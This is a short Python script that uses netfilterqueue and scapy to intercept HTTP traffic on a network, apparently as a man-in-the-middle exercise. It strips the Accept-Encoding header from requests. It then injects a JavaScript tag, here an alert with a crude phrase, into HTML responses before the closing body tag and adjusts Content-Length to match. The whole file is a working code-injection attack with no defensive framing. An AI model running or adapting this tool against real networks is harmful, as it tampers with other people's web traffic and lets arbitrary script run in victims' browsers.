#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load

	try:		
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
	except IndexError:
		pass
	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load

		try:
			if scapy_packet[scapy.TCP].dport == 80:
				print("[+] Request")
				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			elif scapy_packet[scapy.TCP].sport == 80:
				print("[+] Response")
				injection = "<script>alert('CykaBlyat!')</script>"
				load = load.replace("</body>", injection + "</body>")
				content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)

				if content_len_search and "text/html" in load:
					content_len = content_len_search.group(1)
					new_content_len = int(content_len) + len(injection)
					load = load.replace(content_len, str(new_content_len))
		except IndexError:
			pass

		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # Callback-Function
queue.run()
